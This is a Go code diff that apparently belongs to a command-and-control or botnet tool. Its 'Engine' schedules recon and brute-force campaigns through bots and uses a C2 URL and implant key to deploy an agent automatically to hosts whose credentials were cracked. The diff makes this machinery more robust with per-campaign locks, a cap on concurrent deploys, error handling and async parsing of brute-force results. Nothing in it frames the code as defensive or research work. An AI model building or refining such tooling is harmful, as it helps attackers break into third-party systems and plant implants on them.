@@ -24,11 +24,22 @@ type Engine struct {
 	db         *database.DB
 	c2URL      string
 	implantKey string
-	mu         sync.Mutex
+	campLocks  sync.Map
+	deploySem  chan struct{}
 }
 
 func New(db *database.DB, c2URL, implantKey string) *Engine {
-	return &Engine{db: db, c2URL: c2URL, implantKey: implantKey}
+	return &Engine{
+		db:         db,
+		c2URL:      c2URL,
+		implantKey: implantKey,
+		deploySem:  make(chan struct{}, 5),
+	}
+}
+
+func (e *Engine) campMu(campID string) *sync.Mutex {
+	v, _ := e.campLocks.LoadOrStore(campID, &sync.Mutex{})
+	return v.(*sync.Mutex)
 }
 
 func (e *Engine) Start(ctx context.Context) {
@@ -47,9 +58,6 @@ func (e *Engine) Start(ctx context.Context) {
 }
 
 func (e *Engine) tick(ctx context.Context) {
-	e.mu.Lock()
-	defer e.mu.Unlock()
-
 	rows, err := e.db.Query(`SELECT id, type, COALESCE(config::text, '{}') FROM campaigns WHERE status = 'running'`)
 	if err != nil {
 		log.Printf("[-] Engine: failed to query campaigns: %v", err)
@@ -64,6 +72,7 @@ func (e *Engine) tick(ctx context.Context) {
 	for rows.Next() {
 		var c camp
 		if err := rows.Scan(&c.id, &c.cType, &c.config); err != nil {
+			log.Printf("[-] Engine: failed to scan campaign row: %v", err)
 			continue
 		}
 		campaigns = append(campaigns, c)
@@ -71,6 +80,11 @@ func (e *Engine) tick(ctx context.Context) {
 	rows.Close()
 
 	for _, c := range campaigns {
+		mu := e.campMu(c.id)
+		if !mu.TryLock() {
+			continue
+		}
+
 		var taskCount int
 		e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1`, c.id).Scan(&taskCount)
 
@@ -80,6 +94,7 @@ func (e *Engine) tick(ctx context.Context) {
 
 		e.syncResults(c.id, c.cType)
 		e.updateProgress(c.id)
+		mu.Unlock()
 	}
 }
 
@@ -99,7 +114,10 @@ func (e *Engine) generateTasks(ctx context.Context, campID, campType, config str
 		tasks = ReconTasks(config)
 	case models.CampaignTypeBrute:
 		var cfg bruteConfig
-		json.Unmarshal([]byte(config), &cfg)
+		if err := json.Unmarshal([]byte(config), &cfg); err != nil {
+			log.Printf("[-] Campaign %s: invalid brute config: %v", campID[:8], err)
+			return
+		}
 		if cfg.Mode == "external" {
 			go e.RunExternalBrute(campID, config)
 			return
@@ -193,7 +211,7 @@ func (e *Engine) syncResults(campID, campType string) {
 			r.status, r.output, now, r.taskID)
 
 		if campType == models.CampaignTypeBrute && r.status == models.StatusCompleted {
-			e.parseBruteResults(campID, r.botID, r.output)
+			go e.parseBruteResults(campID, r.botID, r.output)
 		}
 	}
 }
@@ -227,6 +245,14 @@ func (e *Engine) parseBruteResults(campID, botID, output string) {
 func (e *Engine) deployAgent(campID, botID, user, pass, target, port string) {
 	if e.c2URL == "" || e.implantKey == "" {
 		log.Printf("[-] Auto-deploy skipped: c2_url or implant_key not configured")
+		return
+	}
+
+	select {
+	case e.deploySem <- struct{}{}:
+		defer func() { <-e.deploySem }()
+	default:
+		log.Printf("[-] Campaign %s: deploy queue full, skipping %s@%s:%s", campID[:8], user, target, port)
 		return
 	}
 
@@ -264,9 +290,15 @@ echo "DEPLOYED:%s@%s:%s:$RPATH"`,
 
 func (e *Engine) updateProgress(campID string) {
 	var total, completed, failed int
-	e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1`, campID).Scan(&total)
-	e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1 AND status = 'completed'`, campID).Scan(&completed)
-	e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1 AND status = 'failed'`, campID).Scan(&failed)
+	err := e.db.QueryRow(`
+		SELECT COUNT(*),
+			COUNT(*) FILTER (WHERE status = 'completed'),
+			COUNT(*) FILTER (WHERE status = 'failed')
+		FROM campaign_tasks WHERE campaign_id = $1`, campID).Scan(&total, &completed, &failed)
+	if err != nil {
+		log.Printf("[-] Campaign %s: failed to query progress: %v", campID[:8], err)
+		return
+	}
 
 	e.db.Exec(`UPDATE campaigns SET total_tasks = $1, completed_tasks = $2, failed_tasks = $3, updated_at = NOW() WHERE id = $4`,
 		total, completed, failed, campID)
@@ -303,6 +335,6 @@ func (e *Engine) getAssignedBots(campID string) []string {
 	return ids
 }
 
-func parseJSON(raw string, v interface{}) {
-	json.Unmarshal([]byte(raw), v)
+func parseJSON(raw string, v interface{}) error {
+	return json.Unmarshal([]byte(raw), v)
 }
